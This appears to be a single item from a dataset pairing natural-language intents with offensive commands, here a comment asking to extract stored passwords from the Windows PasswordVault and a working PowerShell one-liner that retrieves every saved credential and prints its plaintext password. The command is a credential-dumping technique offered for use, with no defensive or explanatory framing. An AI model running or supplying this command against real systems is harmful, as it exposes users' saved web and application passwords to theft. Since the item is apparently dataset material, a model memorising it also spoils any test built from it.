# Natural language intent:
# Get stored passwords from Windows PasswordVault, Using the following PowerShell command we can extract secrets from the Windows PasswordVault, which is a Windows built-in mechanism for storing passwords and web credentials e.g. for Internet Explorer, Edge and other applications:

[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }
